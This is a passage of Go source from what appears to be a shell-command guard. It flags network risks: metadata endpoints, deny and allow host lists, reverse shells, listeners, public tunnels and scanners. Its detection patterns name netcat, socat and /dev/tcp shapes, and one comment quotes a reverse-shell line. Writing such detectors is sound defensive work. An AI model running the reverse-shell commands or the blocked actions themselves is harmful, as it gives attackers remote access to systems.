		t = t[:k]
	}
	return t, t != ""
}

// ncListener reports whether an nc/ncat/netcat invocation is a LISTENER
// (`-l`), which names no outbound host.
func ncListener(cmd *Command) bool {
	return cmd.HasShortFlag('l') || cmd.HasLongFlag("--listen")
}

// gitNamesRemoteURL reports whether a git command is one of the remote verbs
// R-174..R-176 judge (clone/fetch/push/ls-remote). A remote NAME (origin)
// produces no host and leaves the rows inert; only an explicit URL / scp-like
// operand yields one.
func gitNamesRemoteURL(cmd *Command) bool {
	switch cmd.Sub() {
	case "clone", "fetch", "push", "ls-remote":
		return true
	default:
		return false
	}
}

// hasPositionalWord reports whether word appears as a positional operand of
// cmd (case-insensitive).
func hasPositionalWord(cmd *Command, word string) bool {
	for _, p := range cmd.Positionals() {
		if strings.EqualFold(p, word) {
			return true
		}
	}
	return false
}

// isAllDigits reports whether s is non-empty and all ASCII digits.
func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for i := 0; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			return false
		}
	}
	return true
}

// --- host-based matchers (R-174..R-176) --------------------------------

// matchNetworkMetadata implements R-174 (a): any host that resolves to a
// cloud metadata address (ipclass.KindMetadata, any encoding) or is a known
// metadata host name.
func matchNetworkMetadata(_ *MatchContext, cmd *Command) (bool, string) {
	for _, h := range collectNetworkHosts(cmd) {
		if (h.ip != nil && h.kind == ipclass.KindMetadata) || metadataHostnames[h.name] {
			return true, cmd.Base + " reaching metadata endpoint " + h.name
		}
	}
	return false, ""
}

// matchNetworkDenyHost implements R-174 (b): a host matching a
// [guard.network] deny_hosts pattern. Inert while the list is empty.
func matchNetworkDenyHost(ctx *MatchContext, cmd *Command) (bool, string) {
	if len(ctx.Cfg.NetworkDenyHosts) == 0 {
		return false, ""
	}
	for _, h := range collectNetworkHosts(cmd) {
		for _, pat := range ctx.Cfg.NetworkDenyHosts {
			if hostMatchesPattern(h, pat) {
				return true, cmd.Base + " to denied host " + h.name
			}
		}
	}
	return false, ""
}

// matchNetworkPrivateRange implements R-175 (a): a host that is a private,
// link-local, carrier-NAT or unique-local address. Loopback and unspecified
// are excluded (Kind.Private()), and a metadata address is R-174's.
func matchNetworkPrivateRange(_ *MatchContext, cmd *Command) (bool, string) {
	for _, h := range collectNetworkHosts(cmd) {
		if h.ip != nil && h.kind.Private() {
			return true, cmd.Base + " to " + h.kind.String() + " address " + h.name
		}
	}
	return false, ""
}

// matchNetworkRawPublicIP implements R-175 (b): a host given as a raw PUBLIC
// IP literal instead of a name.
func matchNetworkRawPublicIP(_ *MatchContext, cmd *Command) (bool, string) {
	for _, h := range collectNetworkHosts(cmd) {
		if h.rawIP && h.kind == ipclass.KindPublic {
			return true, cmd.Base + " to raw public IP " + h.name
		}
	}
	return false, ""
}

// matchNetworkNotAllowed implements R-176: a host not on [guard.network]
// allow_hosts. Loopback always passes; with the row raised, an empty list
// means every non-loopback host matches.
func matchNetworkNotAllowed(ctx *MatchContext, cmd *Command) (bool, string) {
	for _, h := range collectNetworkHosts(cmd) {
		if h.ip != nil && h.kind == ipclass.KindLoopback {
			continue
		}
		if ipclass.IsLoopbackHost(h.name) {
			continue
		}
		if !hostOnAllowList(h, ctx.Cfg.NetworkAllowHosts) {
			return true, cmd.Base + " to non-allow-listed host " + h.name
		}
	}
	return false, ""
}

// hostOnAllowList reports whether h matches any allow pattern. An empty list
// matches nothing (so every non-loopback host is "not allowed").
func hostOnAllowList(h networkHost, patterns []string) bool {
	for _, pat := range patterns {
		if hostMatchesPattern(h, pat) {
			return true
		}
	}
	return false
}

// hostMatchesPattern matches a host against one [guard.network] pattern:
// "example.com" matches it and its subdomains, "*.example.com" only
// subdomains, an IP literal matches exactly (after ParseHostIP
// normalisation), a CIDR block contains an IP literal. Case-insensitive.
//
// The pattern is read leniently (CFG-5) so a deny entry never silently stops
// matching: a trailing FQDN dot, a :port, a scheme or path, surrounding
// space, a non-ASCII spelling and a leading "*" without a dot
// ("*pastebin.com", read as "pastebin.com") are all normalised away. A bare
// "*" or an empty remainder matches nothing.
func hostMatchesPattern(h networkHost, pattern string) bool {
	pat := strings.ToLower(strings.TrimSpace(pattern))
	if pat == "" {
		return false
	}
	if strings.Contains(pat, "/") { // CIDR
		if _, ipnet, err := net.ParseCIDR(pat); err == nil {
			return h.ip != nil && ipnet.Contains(h.ip)
		}
	}
	pat = normalizeHostText(pat)
	if strings.Contains(pat, "://") {
		u, ok := urlHost(pat)
		if !ok {
			return false
		}
		pat = u
	}
	if j := strings.IndexAny(pat, "/?#"); j >= 0 {
		pat = pat[:j]
	}
	if strings.HasPrefix(pat, "[") { // [ipv6] or [ipv6]:port
		if k := strings.IndexByte(pat, ']'); k >= 0 {
			pat = pat[1:k]
		}
	} else if _, whole := ipclass.ParseHostIP(pat); !whole {
		if k := strings.LastIndexByte(pat, ':'); k >= 0 && isAllDigits(pat[k+1:]) && strings.Count(pat, ":") == 1 {
			pat = pat[:k] // :port
		}
	}
	pat = strings.TrimRight(pat, ".")
	subOnly := strings.HasPrefix(pat, "*.")
	if subOnly {
		pat = pat[2:]
	} else {
		pat = strings.TrimLeft(pat, "*.")
	}
	if pat == "" {
		return false
	}
	if pip, ok := ipclass.ParseHostIP(pat); ok { // IP literal pattern
		return h.ip != nil && pip.Equal(h.ip)
	}
	if subOnly { // only subdomains
		return strings.HasSuffix(h.name, "."+pat)
	}
	return h.name == pat || strings.HasSuffix(h.name, "."+pat) // host and subdomains
}

// --- shape matchers (R-177..R-179) -------------------------------------

// ncExecBases are the netcat family whose -e/-c/--exec attaches a program to
// the socket (the reverse-shell shape).
var ncExecBases = map[string]bool{"nc": true, "ncat": true, "netcat": true}

// socatExecKeywords are the socat address types that run a program on the
// peer connection (the reverse-shell half, paired with a network address).
var socatExecKeywords = []string{"exec:", "system:"}

// matchReverseShell implements R-177 (a): a shell or program wired to a
// network socket, across a command line's units. Four shapes:
//   - a /dev/tcp// /dev/udp/ redirect (`bash -i >& /dev/tcp/h/p 0>&1`);
//   - nc/ncat/netcat with -e/-c/--exec/--sh-exec;
//   - socat with EXEC:/SYSTEM: AND a TCP/UDP/OPENSSL address;
//   - mkfifo paired with an nc pipeline.
func matchReverseShell(ctx *MatchContext) (bool, string) {
	var sawMkfifo, sawNC bool
	for i := range ctx.Cmds {
		c := netEffective(&ctx.Cmds[i])
		if commandReferencesDevSocket(c) {
			return true, c.Base + " redirected to a /dev/tcp network socket"
		}
		if ncExecBases[c.Base] && ncHasExecFlag(c) {
			return true, c.Base + " attaching a program to the socket (-e/--exec)"
		}
		if c.Base == "socat" && socatExecReverseShell(c) {
			return true, "socat running a program over a network address (EXEC:/SYSTEM:)"
		}
		if c.Base == "mkfifo" {
			sawMkfifo = true
		}
		if ncExecBases[c.Base] {
			sawNC = true
		}
	}
	if sawMkfifo && sawNC {
		return true, "mkfifo paired with nc (named-pipe reverse-shell shape)"
	}
	return false, ""
}

// commandReferencesDevSocket reports a /dev/tcp/ or /dev/udp/ reference in any
// token, redirect target or heredoc of the unit (bash's network redirect).
func commandReferencesDevSocket(c *Command) bool {
	for _, t := range c.Argv {
		if devSocketToken(t) {
			return true
		}
	}
	for _, t := range c.RedirectTargets {
		if devSocketToken(t) {
			return true
		}
	}
	return devSocketToken(c.Heredoc)
}

// devSocketToken reports whether s references /dev/tcp/ or /dev/udp/.
func devSocketToken(s string) bool {
	l := strings.ToLower(s)
	return strings.Contains(l, "/dev/tcp/") || strings.Contains(l, "/dev/udp/")
}

// ncHasExecFlag reports an -e/-c/--exec/--sh-exec on a netcat command.
func ncHasExecFlag(c *Command) bool {
	return c.HasShortFlag('e') || c.HasShortFlag('c') ||
		c.HasLongFlag("--exec", "--sh-exec")
}

// socatExecReverseShell reports a socat command that BOTH runs a program
// (EXEC:/SYSTEM:) and names a network address (a connecting or listening
// TCP/UDP/OPENSSL form).
func socatExecReverseShell(c *Command) bool {
	exec, netw := false, false
	for _, t := range c.Args() {
		l := strings.ToLower(t)
		for _, kw := range socatExecKeywords {
			if strings.HasPrefix(l, kw) {
				exec = true
			}
		}
		if socatNetworkAddress(l) {
			netw = true
		}
	}
	return exec && netw
}

// socatNetFamilies are the socat address families R-177 (a) treats as a
// network socket (connecting or listening forms, any IP version).
var socatNetFamilies = setOf("tcp", "tcp4", "tcp6", "udp", "udp4", "udp6", "openssl", "ssl", "sctp", "sctp4", "sctp6")

// socatListenSuffixes are the address-type endings that make a socat address
// wait for a peer instead of dialing one: the full keywords and socat's
// abbreviations (`TCP-L:`, `UDP-RECV:`).
var socatListenSuffixes = []string{"-listen", "-l", "-recvfrom", "-recv"}

// socatAddrHead returns the lowercased address-type keyword of a socat
// address token (the text before the first ':' or ',').
func socatAddrHead(token string) string {
	l := strings.ToLower(token)
	if i := strings.IndexAny(l, ":,"); i >= 0 {
		return l[:i]
	}
	return l
}

// socatListenAddress reports whether a socat address token is a LISTEN form
// (`TCP-LISTEN:`, `TCP4-L:`, `UDP-RECVFROM:`, `UNIX-LISTEN:`).
func socatListenAddress(token string) bool {
	head := socatAddrHead(token)
	for _, s := range socatListenSuffixes {
		if len(head) > len(s) && strings.HasSuffix(head, s) {
			return true
		}
	}
	return false
}

// socatNetworkAddress reports whether a socat address token names a
// TCP/UDP/OPENSSL form (connecting or listening, abbreviations included).
func socatNetworkAddress(token string) bool {
	head := socatAddrHead(token)
	for _, s := range append([]string{"-connect"}, socatListenSuffixes...) {
		head = strings.TrimSuffix(head, s)
	}
	return socatNetFamilies[head]
}

// matchNetworkListener implements R-177 (b): nc/ncat/netcat -l, or socat with
// a TCP-LISTEN:/UDP-LISTEN: address.
func matchNetworkListener(ctx *MatchContext) (bool, string) {
	for i := range ctx.Cmds {
		c := netEffective(&ctx.Cmds[i])
		if ncExecBases[c.Base] && ncListener(c) {
			return true, c.Base + " opening a listening socket (-l)"
		}
		if c.Base == "socat" {
			for _, t := range c.Args() {
				l := strings.ToLower(t)
				if socatListenAddress(t) || strings.Contains(l, "-listen:") || strings.Contains(l, "listen:") {
					return true, "socat opening a listening socket (" + t + ")"
				}
			}
		}
	}
	return false, ""
}

// tunnelSpec is one tunnelling tool's shape: the command base plus the
// subcommand / flag that makes it EXPOSE this machine. A nil subs means the
// base alone is the tunnel (frpc, lt, localtunnel).
type tunnelSpec struct {
	subs    map[string]bool     // first positional that exposes
	notSubs map[string]bool     // positionals that do NOT (list/info/status)
	exposes func(*Command) bool // a flag shape that exposes (ssh -R, in any cluster)
	urlFlag bool                // --url exposes (cloudflared tunnel --url)
}

// tunnelSpecs is the tunnel table (R-178), one row per tool.
var tunnelSpecs = map[string]tunnelSpec{
	"ngrok":       {subs: setOf("http", "tcp", "tls", "start", "tunnel")},
	"cloudflared": {subs: setOf("run", "create"), notSubs: setOf("list", "info", "delete"), urlFlag: true},
	"ssh":         {exposes: sshRemoteForward},
	"lt":          {subs: nil},
	"localtunnel": {subs: nil},
	"bore":        {subs: setOf("local")},
	"tailscale":   {subs: setOf("funnel")},
	"zrok":        {subs: setOf("share")},
	"frpc":        {subs: nil},
	"devtunnel":   {subs: setOf("host")},
	"code":        {subs: setOf("tunnel"), notSubs: setOf("status")},
}

// matchNetworkTunnel implements R-178: a tool exposing this machine to the
// public internet.
func matchNetworkTunnel(_ *MatchContext, cmd *Command) (bool, string) {
	cmd = netEffective(cmd)
	spec, ok := tunnelSpecs[cmd.Base]
	if !ok {
		return false, ""
	}
	pos := cmd.Positionals()
	// cloudflared and code gate on `tunnel` plus a sub-subcommand / flag.
	if cmd.Base == "cloudflared" {
		if len(pos) == 0 || !strings.EqualFold(pos[0], "tunnel") {
			return false, ""
		}
		if len(pos) > 1 && spec.notSubs[strings.ToLower(pos[1])] {
			return false, ""
		}
		if (len(pos) > 1 && spec.subs[strings.ToLower(pos[1])]) || (spec.urlFlag && cmd.HasLongFlag("--url")) {
			return true, "cloudflared exposing a local service through a tunnel"
		}
		return false, ""
	}
	if spec.exposes != nil && spec.exposes(cmd) {
		return true, cmd.Base + " -R exposing a remote-forwarded port"
	}
	if spec.subs == nil && spec.exposes == nil {
		return true, cmd.Base + " opening a public tunnel"
	}
	if len(pos) > 0 {
		sub := strings.ToLower(pos[0])
		if spec.notSubs[sub] {
			return false, ""
		}
		if spec.subs[sub] {
			// `code tunnel status` is excluded via notSubs on pos[1].
			if cmd.Base == "code" && len(pos) > 1 && spec.notSubs[strings.ToLower(pos[1])] {
				return false, ""
			}
			return true, cmd.Base + " " + sub + " opening a public tunnel"
		}
	}
	return false, ""
}

// sshRemoteForward reports an ssh remote port forward (NET-4): -R in any
// short-flag cluster (`-R9000:h:22`, `-NR 9000:h:22`, `-fNR9000:h:22`) or
// `-o RemoteForward=...`. It reads the argument list the way OpenSSH does -
// options may follow the destination, and the second non-option word starts
// the remote command, whose own flags (`ssh host grep -R x`) are not ssh's.
// A valued letter ends its cluster (its value is the rest of the token or the
// next token), the same rule skipSSHFlags uses.
func sshRemoteForward(cmd *Command) bool {
	argv := cmd.Argv
	sawHost := false
	for i := 1; i < len(argv); {
		t := argv[i]
		i++
		if t == "--" || len(t) < 2 || t[0] != '-' {
			if sawHost {
				return false // the remote command starts here
			}
			sawHost = true
			continue
		}
		for k := 1; k < len(t); k++ {
			l := t[k]
			if !sshValuedFlags[l] {
				continue
			}
			val := t[k+1:]
			if val == "" && i < len(argv) {
				val = argv[i]
				i++
			}
			if l == 'R' {
				return true
			}
			if l == 'o' {
				v := strings.ToLower(strings.TrimSpace(val))
				if strings.HasPrefix(v, "remoteforward") {
					return true
				}
			}
			break
		}
	}
	return false
}

// scannerBases are the network / vulnerability scanners R-179 asks about.
var scannerBases = map[string]bool{
	"nmap": true, "masscan": true, "zmap": true, "rustscan": true,
	"naabu": true, "unicornscan": true, "hping3": true,
	"nikto": true, "nuclei": true, "sqlmap": true,
	// Web content, directory and credential fuzzers and the OWASP ZAP launchers
	// (security-assessments depth arc, D33). The base is the command word with
	// its directory and a .exe/.com/.bat/.cmd suffix stripped and lowercased, so
	// `./zap.sh` and `ZAP.SH` match; an interpreter prefix (`python zap-baseline.py`)
	// does not, the same limit every other base here has.
	"ffuf": true, "gobuster": true, "feroxbuster": true, "hydra": true,
	"wfuzz": true, "zaproxy": true, "zap.sh": true, "zap-baseline.py": true,
}

// matchNetworkScanner implements R-179: a network / vulnerability scanner.
func matchNetworkScanner(_ *MatchContext, cmd *Command) (bool, string) {
	if scannerBases[cmd.Base] {
		return true, cmd.Base + " network/vulnerability scan"
	}
	return false, ""
}
